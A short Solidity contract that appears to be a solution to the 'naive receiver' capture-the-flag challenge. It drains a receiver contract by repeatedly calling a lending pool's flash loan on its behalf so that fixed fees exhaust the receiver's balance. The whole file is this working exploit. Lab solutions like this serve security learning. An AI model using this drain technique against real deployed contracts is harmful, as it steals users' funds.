
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../../contracts/naive-receiver/NaiveReceiverLenderPool.sol";

/**
 * @title NaiveFlashLoanAttack
 * @author Ping-Jui
 */

contract NaiveFlashLoanAttack {
    
    function drain(address payable receiver, 
                   address payable pool) public payable {
        uint256 times = receiver.balance / NaiveReceiverLenderPool(pool).fixedFee();
        for (uint256 i = 0; i < times ; ++i) { 
            NaiveReceiverLenderPool(pool).flashLoan(receiver, 1);
        }
    }
}
